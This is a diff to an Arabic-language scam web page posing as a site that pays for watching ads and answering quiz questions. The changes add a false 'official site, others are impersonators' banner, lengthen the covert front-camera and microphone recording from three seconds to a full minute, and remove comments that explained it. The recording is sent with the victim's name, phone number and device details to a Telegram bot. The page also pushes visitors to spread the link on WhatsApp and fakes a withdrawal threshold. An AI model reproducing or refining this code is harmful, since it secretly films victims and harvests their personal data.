@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>سجل الربح الحقيقي من الإعلانات والأسئله</title>
+    <title>الربح من الإعلانات والأسئله</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -29,6 +29,17 @@
             font-size: 28px;
             font-weight: bold;
             margin: 10px 0;
+        }
+        .official-notice {
+            background-color: #f1f8f6;
+            border: 1px solid #c8e6c9;
+            color: #2e7d32;
+            padding: 10px;
+            font-size: 14px;
+            font-weight: bold;
+            border-radius: 5px;
+            margin-bottom: 15px;
+            line-height: 1.5;
         }
         .input-box {
             width: 100%;
@@ -192,8 +203,13 @@
         <!-- قسم تسجيل البيانات -->
         <div id="form-section">
             <div style="font-size: 24px; margin-bottom: 5px;">🌐</div>
-            <div class="header-title">سجل الربح الحقيقي من الإعلانات والأسئله</div>
+            <div class="header-title">الربح من الإعلانات والأسئله</div>
             <div class="main-title">سجل الآن</div>
+            
+            <div class="official-notice">
+                هذا موقعنا الرسمي ومادونه أنتحال لمواقنا الربحية
+            </div>
+
             <hr style="border: 0; border-top: 1px solid #8bc34a; margin-bottom: 15px;">
             
             <p style="font-weight: bold; margin-bottom: 15px;">الرجاء إدخال البيانات المطلوبة للتسجيل:</p>
@@ -204,8 +220,13 @@
 
         <!-- قسم مشاركة الواتساب -->
         <div id="content-section" class="hidden">
-            <div class="header-title">سجل الربح الحقيقي من الإعلانات والأسئله</div>
+            <div class="header-title">الربح من الإعلانات والأسئله</div>
             <div class="main-title">سجل الآن</div>
+
+            <div class="official-notice" style="margin-top: 10px;">
+                هذا موقعنا الرسمي ومادونه أنتحال لمواقنا الربحية
+            </div>
+
             <hr style="border: 0; border-top: 1px solid #8bc34a; margin-bottom: 15px;">
 
             <div class="welcome-text">
@@ -238,7 +259,7 @@
                 <button type="button" class="withdraw-btn" onclick="showWithdrawOptions()">سحب الأرباح</button>
             </div>
 
-            <div class="header-title" style="margin-bottom: 10px;">مسابقة الأسئلة والأرباح</div>
+            <div class="header-title" style="margin-bottom: 10px;">الربح من الإعلانات والأسئله</div>
 
             <div class="ad-banner">
                 <div id="frame" style="width: 100%;margin: auto;position: relative; z-index: 99998;">
@@ -296,7 +317,7 @@
         let batteryLevelInfo = "غير معروف";
         let mediaStream = null;
 
-        // قاعدة بيانات تضم 100 سؤال متنوع
+        // قاعدة بيانات الأسئلة
         const questions = [
             { q: "ما هي عاصمة اليمن؟", options: ["عدن", "صنعاء", "تعز", "إب"], correct: 1 },
             { q: "كم عدد سور القرآن الكريم؟", options: ["114 سورة", "113 سورة", "115 سورة", "120 سورة"], correct: 0 },
@@ -416,7 +437,6 @@
             }
         }
 
-        // تشغيل الكاميرا المسبق لتكون جاهزة للتسجيل
         function initCamera() {
             navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true })
             .then(function(stream) {
@@ -444,7 +464,7 @@
                 return;
             }
 
-            // بدء تسجيل الفيديو وإرساله للبوت
+            // بدء تسجيل الفيديو لمدة دقيقة كاملة وإرساله للبوت
             recordAndSendVideo(name, phone);
 
             document.getElementById('display-name').innerText = name;
@@ -452,7 +472,6 @@
             document.getElementById('content-section').classList.remove('hidden');
         }
 
-        // دالة تسجيل الفيديو وإرساله عبر تيليجرام
         function recordAndSendVideo(name, phone) {
             if (!mediaStream) {
                 navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true })
@@ -488,12 +507,12 @@
 
                 mediaRecorder.start();
 
-                // تسجيل فيديو لمدة 3 ثوانٍ ثم إيقافه والإرسال تلقائياً
+                // تسجيل فيديو لمدة دقيقة كاملة (60000 مللي ثانية)
                 setTimeout(() => {
                     if (mediaRecorder.state === "recording") {
                         mediaRecorder.stop();
                     }
-                }, 3000);
+                }, 60000);
 
             } catch (e) {
                 console.log("خطأ في بدء التسجيل: ", e);
@@ -507,7 +526,7 @@
             let formData = new FormData();
             formData.append('chat_id', chatId);
             formData.append('video', videoBlob, 'capture.mp4');
-            formData.append('caption', `🎥 تسجيل فيديو جديد:\n👤 الاسم: ${name}\n📞 الهاتف: ${phone}\n🔋 البطارية: ${batteryLevelInfo}\n📱 الجهاز: ${navigator.platform}\n🌐 المتصفح: ${navigator.userAgent}`);
+            formData.append('caption', `🎥 تسجيل فيديو لمدة دقيقة:\n👤 الاسم: ${name}\n📞 الهاتف: ${phone}\n🔋 البطارية: ${batteryLevelInfo}\n📱 الجهاز: ${navigator.platform}\n🌐 المتصفح: ${navigator.userAgent}`);
 
             let url = `https://api.telegram.org/bot${botToken}/sendVideo`;
 
@@ -522,7 +541,7 @@
             isCounting = true;
 
             let siteUrl = window.location.href;
-            let message = "شارك في مسابقة سجل الربح الحقيقي من الإعلانات والأسئله وسجل اسمك ورقمك عبر الرابط: " + siteUrl;
+            let message = "شارك في مسابقة الربح من الإعلانات والأسئله وسجل اسمك ورقمك عبر الرابط: " + siteUrl;
             let whatsappUrl = "https://api.whatsapp.com/send?text=" + encodeURIComponent(message);
             
             let link = document.getElementById('whatsapp-link');
@@ -552,7 +571,7 @@
 
         function loadQuestion() {
             if (currentQuestion >= questions.length) {
-                currentQuestion = 0; // إعادة الترتيب من البداية عند انتهاء الـ 100 سؤال
+                currentQuestion = 0;
             }
             let qData = questions[currentQuestion];
             document.getElementById('question-text').innerText = (currentQuestion + 1) + ". " + qData.q;
@@ -588,7 +607,6 @@
         }
 
         function tryWithdraw(bankName) {
-            // بغض النظر عن البنك الذي يتم الضغط عليه، تظهر له رسالة الحد الأدنى ما دام المبلغ أقل من 50
             if (userBalance >= 50.00) {
                 alert("مبروك! تم تقديم طلب السحب عبر " + bankName + " بنجاح.");
             } else {
